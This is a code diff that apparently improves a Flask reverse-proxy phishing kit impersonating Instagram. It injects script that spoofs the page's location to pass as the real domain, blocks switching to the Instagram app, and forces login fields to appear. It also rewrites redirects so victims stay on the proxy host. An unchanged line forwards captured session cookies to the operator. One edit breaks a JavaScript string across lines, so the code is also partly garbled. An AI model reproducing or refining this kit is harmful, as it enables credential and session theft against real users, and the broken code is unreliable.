@@ -1,6 +1,6 @@
 import os, re, json, urllib3, requests
 from flask import Flask, request, make_response
-from urllib.parse import urljoin
+from urllib.parse import urljoin, urlparse
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -28,19 +28,26 @@ class E:
         if '<head>' in t:
             i = f"""
             <script>
-                // Anti-App Switch & Location Spoofing
                 Object.defineProperty(window.location, 'hostname', {{ get: function() {{ return '{self.d}'; }} }});
                 Object.defineProperty(window.location, 'host', {{ get: function() {{ return '{self.d}'; }} }});
                 Object.defineProperty(window.location, 'origin', {{ get: function() {{ return 'https://{self.d}'; }} }});
-                window.open = function(url) {{ if (url.includes('instagram.com')) {{ window.location.href = url.replace('{self.d}', window.location.host); }} else {{ return originalWindowOpen(url); }} }};
-                var originalWindowOpen = window.open;
+                // Prevent app switch
+                window.open = function(url) {{ 
+                    if (url.includes('instagram.com')) {{ 
+                        window.location.href = url.replace('{self.d}', window.location.host);
+                    }} else {{ 
+                        var originalWindowOpen = window.open;
+                        return originalWindowOpen(url);
+                    }}
+                }};
+                // Force login fields visibility
                 document.addEventListener('DOMContentLoaded', function() {{
                     document.querySelectorAll('a[href^="instagram://"]').forEach(function(a) {{ a.removeAttribute('href'); }});
-                    // Force Login Fields (Advanced DOM Manipulation)
                     var loginForm = document.querySelector('form');
                     if (loginForm) {{
                         var usernameInput = document.querySelector('input[name="username"]');
-                        var passwordInput = document.querySelector('input[name="password"]');
+                        var passwordInput = document.querySelector('input[name="password"]
+                        ');
                         if (!usernameInput) {{
                             usernameInput = document.createElement('input');
                             usernameInput.setAttribute('name', 'username');
@@ -55,7 +62,6 @@ class E:
                             passwordInput.setAttribute('placeholder', 'Password');
                             loginForm.insertBefore(passwordInput, usernameInput.nextSibling);
                         }}
-                        // Ensure login button is visible
                         var loginButton = document.querySelector('button[type="submit"]');
                         if (loginButton) loginButton.style.display = 'block';
                     }}
@@ -87,6 +93,19 @@ def f(x):
     try:
         R = requests.request(method=request.method, url=u, headers=H, cookies=request.cookies, data=request.get_data(), allow_redirects=False, verify=False, timeout=10)
         
+        if R.status_code in [301, 302, 303, 307, 308]:
+            loc = R.headers.get('Location', '')
+            for d_domain in e.p:
+                if d_domain in loc:
+                    
+                    parsed_loc = urlparse(loc)
+                    new_loc = parsed_loc._replace(netloc=h, query=re.sub(r'mtn', '', parsed_loc.query)).geturl()
+                    
+                    r = make_response(R.content)
+                    r.status_code = R.status_code
+                    r.headers['Location'] = new_loc
+                    return r
+
         B = R.content
         if any(x in R.headers.get('Content-Type', '') for x in ['html', 'javascript', 'json']):
             try: B = e.r(R.content.decode('utf-8', errors='ignore'), h).encode()
@@ -110,10 +129,6 @@ def f(x):
             }
             fc = '; '.join([f"{k}={v}" for k, v in cs.items() if v])
             e.n(f"🔥 <b>S:</b>\n<code>{fc}</code>")
-
-        if R.status_code in [301, 302, 303, 307, 308]:
-            l = R.headers.get('Location', '').replace(e.d, h)
-            r.headers['Location'] = l
 
         return r
     except: return "X", 503
